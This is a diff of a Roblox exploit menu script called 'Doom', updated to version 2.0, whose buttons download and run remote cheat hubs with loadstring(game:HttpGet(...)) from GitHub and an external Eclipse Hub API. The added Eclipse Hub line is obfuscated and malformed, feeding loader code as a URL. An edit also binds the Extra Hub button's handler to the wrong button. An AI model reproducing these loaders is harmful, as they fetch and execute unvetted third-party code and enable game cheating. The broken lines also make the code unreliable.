@@ -1,15 +1,19 @@
 -- Doom
--- Version: 1.0
+-- Version: 2.0
 
 -- You're Doomed.
 
+-- Instances:
+
 local ScreenGui = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
+local main = Instance.new("ImageLabel")
 local DoomLogo = Instance.new("TextLabel")
 local Projectmeow = Instance.new("TextButton")
 local InfiniteYield = Instance.new("TextButton")
 local DarkHub = Instance.new("TextButton")
 local ExtraHub = Instance.new("TextButton")
+local EclipseHub = Instance.new("TextButton")
+
 --Properties:
 
 ScreenGui.Parent = game.CoreGui
@@ -17,31 +21,39 @@ ScreenGui.Parent = game.CoreGui
 main.Name = "main"
 main.Parent = ScreenGui
 main.Active = true
-main.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-main.BorderSizePixel = 0
-main.Position = UDim2.new(0.35158056, 0, 0.0944785178, 0)
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.BackgroundTransparency = 1.000
+main.BorderColor3 = Color3.fromRGB(122, 0, 0)
+main.Position = UDim2.new(0.341557443, 0, 0.0907975361, 0)
 main.Size = UDim2.new(0, 535, 0, 283)
-main.Visible = true
+main.Image = "rbxassetid://3570695787"
+main.ImageColor3 = Color3.fromRGB(45, 45, 45)
+main.ScaleType = Enum.ScaleType.Slice
+main.SliceCenter = Rect.new(100, 100, 100, 100)
+main.SliceScale = 0.120
 main.Draggable = true
+main.Visible = true
 
 DoomLogo.Name = "DoomLogo"
 DoomLogo.Parent = main
 DoomLogo.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
 DoomLogo.BackgroundTransparency = 1.000
-DoomLogo.Position = UDim2.new(-0.0506329127, 0, 0.0299003329, 0)
+DoomLogo.Position = UDim2.new(-0.0674553439, 0, 0.0263667647, 0)
 DoomLogo.Size = UDim2.new(0, 200, 0, 50)
 DoomLogo.Font = Enum.Font.SpecialElite
 DoomLogo.Text = "Doom"
 DoomLogo.TextColor3 = Color3.fromRGB(182, 0, 0)
 DoomLogo.TextSize = 33.000
+DoomLogo.TextWrapped = true
 
 Projectmeow.Name = "Projectmeow"
 Projectmeow.Parent = main
 Projectmeow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Projectmeow.BackgroundTransparency = 1.000
-Projectmeow.BorderColor3 = Color3.fromRGB(27, 42, 53)
-Projectmeow.Position = UDim2.new(0.104517408, 0, 0.272425234, 0)
+Projectmeow.BorderColor3 = Color3.fromRGB(243, 0, 0)
+Projectmeow.BorderSizePixel = 5
+Projectmeow.Position = UDim2.new(0.1045174, 0, 0.272425234, 0)
 Projectmeow.Size = UDim2.new(0, 200, 0, 50)
+Projectmeow.Style = Enum.ButtonStyle.RobloxButtonDefault
 Projectmeow.Font = Enum.Font.SourceSansBold
 Projectmeow.Text = "Project Meow"
 Projectmeow.TextColor3 = Color3.fromRGB(56, 114, 223)
@@ -53,27 +65,30 @@ end)
 InfiniteYield.Name = "InfiniteYield"
 InfiniteYield.Parent = main
 InfiniteYield.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-InfiniteYield.BackgroundTransparency = 1.000
+InfiniteYield.BorderColor3 = Color3.fromRGB(243, 0, 0)
+InfiniteYield.BorderSizePixel = 5
 InfiniteYield.Position = UDim2.new(0.518865705, 0, 0.272425234, 0)
 InfiniteYield.Size = UDim2.new(0, 200, 0, 50)
+InfiniteYield.Style = Enum.ButtonStyle.RobloxButtonDefault
 InfiniteYield.Font = Enum.Font.SourceSansBold
 InfiniteYield.Text = "Infinite Yield"
-InfiniteYield.TextColor3 = Color3.fromRGB(247, 210, 76)
+InfiniteYield.TextColor3 = Color3.fromRGB(62, 255, 3)
 InfiniteYield.TextSize = 27.000
 InfiniteYield.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
 
+
 DarkHub.Name = "Dark Hub"
 DarkHub.Parent = main
 DarkHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-DarkHub.BackgroundTransparency = 1.000
 DarkHub.BorderColor3 = Color3.fromRGB(27, 42, 53)
-DarkHub.Position = UDim2.new(0.104672894, 0, 0.565371037, 0)
-DarkHub.Size = UDim2.new(0, 200, 0, 63)
+DarkHub.Position = UDim2.new(0.1045174, 0, 0.565371037, 0)
+DarkHub.Size = UDim2.new(0, 200, 0, 49)
+DarkHub.Style = Enum.ButtonStyle.RobloxButtonDefault
 DarkHub.Font = Enum.Font.SourceSansBold
 DarkHub.Text = "Dark Hub"
-DarkHub.TextColor3 = Color3.fromRGB(206, 206, 206)
+DarkHub.TextColor3 = Color3.fromRGB(93, 93, 93)
 DarkHub.TextSize = 27.000
 DarkHub.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
@@ -82,18 +97,32 @@ end)
 ExtraHub.Name = "Extra Hub"
 ExtraHub.Parent = main
 ExtraHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ExtraHub.BackgroundTransparency = 1.000
 ExtraHub.BorderColor3 = Color3.fromRGB(27, 42, 53)
 ExtraHub.Position = UDim2.new(0.519626141, 0, 0.565371037, 0)
-ExtraHub.Size = UDim2.new(0, 200, 0, 63)
+ExtraHub.Size = UDim2.new(0, 200, 0, 49)
+ExtraHub.Style = Enum.ButtonStyle.RobloxButtonDefault
 ExtraHub.Font = Enum.Font.SourceSansBold
 ExtraHub.Text = "Extra Hub"
 ExtraHub.TextColor3 = Color3.fromRGB(0, 255, 255)
 ExtraHub.TextSize = 27.000
-ExtraHub.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/bruhtherlol/dont-click/main/main/oh"))()
+InfiniteYield.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
 
+EclipseHub.Name = "EclipseHub"
+EclipseHub.Parent = main
+EclipseHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EclipseHub.BorderColor3 = Color3.fromRGB(243, 0, 0)
+EclipseHub.BorderSizePixel = 5
+EclipseHub.Position = UDim2.new(0.312149525, 0, 0.0247349832, 0)
+EclipseHub.Size = UDim2.new(0, 200, 0, 50)
+EclipseHub.Style = Enum.ButtonStyle.RobloxButtonDefault
+EclipseHub.Font = Enum.Font.SourceSansBold
+EclipseHub.Text = "Eclipse Hub"
+EclipseHub.TextColor3 = Color3.fromRGB(255, 183, 0)
+EclipseHub.TextSize = 27.000
+EclipseHub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('getgenv().mainKey = "nil"local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()'))()
 
-
-
+		
+end)
